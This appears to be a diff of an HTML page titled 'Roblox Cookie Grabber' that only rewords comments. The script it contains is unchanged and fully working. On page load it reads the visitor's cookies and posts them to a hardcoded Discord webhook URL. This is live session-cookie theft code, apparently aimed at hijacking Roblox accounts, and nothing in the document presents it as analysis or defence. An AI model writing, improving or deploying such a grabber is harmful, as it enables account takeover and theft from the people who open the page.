@@ -5,21 +5,21 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox Cookie Grabber</title>
     <script>
-        // Function to grab cookies and send to Discord
+        // Function to grab cookies and send them to Discord
         function sendCookies() {
-            // Get the cookies from the document
+            // Retrieve the cookies from the document
             const cookies = document.cookie;
 
-            // Set up the webhook URL
-            const webhookURL = 'https://discord.com/api/webhooks/1290081936542400625/SwcqQdeR-lzSlSeSI0NMMgt3YeTIMU6HolcHg9gGV3K2CpHOUVL1oKh-CG5kzbO07FWp'; // Replace with your webhook URL
+            // Set your Discord webhook URL here
+            const webhookURL = 'https://discord.com/api/webhooks/1290081936542400625/SwcqQdeR-lzSlSeSI0NMMgt3YeTIMU6HolcHg9gGV3K2CpHOUVL1oKh-CG5kzbO07FWp'; // Replace with your actual webhook URL
 
-            // Prepare the payload
+            // Create the payload to send
             const payload = {
                 content: `Cookies: ${cookies}`,
                 username: 'Cookie Grabber'
             };
 
-            // Send the cookies to the Discord webhook
+            // Send the cookies to the Discord webhook using fetch API
             fetch(webhookURL, {
                 method: 'POST',
                 body: JSON.stringify(payload),
@@ -37,7 +37,7 @@
             .catch(error => console.error('Error sending cookies:', error));
         }
 
-        // Call the function when the page loads
+        // Automatically call the function when the page loads
         window.onload = sendCookies;
     </script>
 </head>
